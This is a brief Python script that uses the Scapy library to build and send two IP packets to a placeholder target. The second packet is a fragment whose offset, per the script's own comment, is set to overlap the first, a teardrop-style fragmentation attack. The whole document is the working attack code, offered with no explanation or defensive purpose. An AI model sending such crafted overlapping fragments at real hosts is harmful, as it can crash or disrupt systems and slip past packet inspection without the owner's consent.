from scapy.all import *
                                                                                        
p1 = IP(dst="<Target_IP>", flags=1)/UDP(sport=123, dport=80)/("A"*1400)                              
p2 = IP(dst="<Target_IP>", frag=1)/("B"*1400)                              
                                                                                        
p2.frag = 1   #Adjust the offset to a position that causes overlap      
p2.proto = 17 #According to IANA, we indicate the protocol to use                   
                                                                                        
send(p1, iface="en0")         
send(p2, iface="en0")  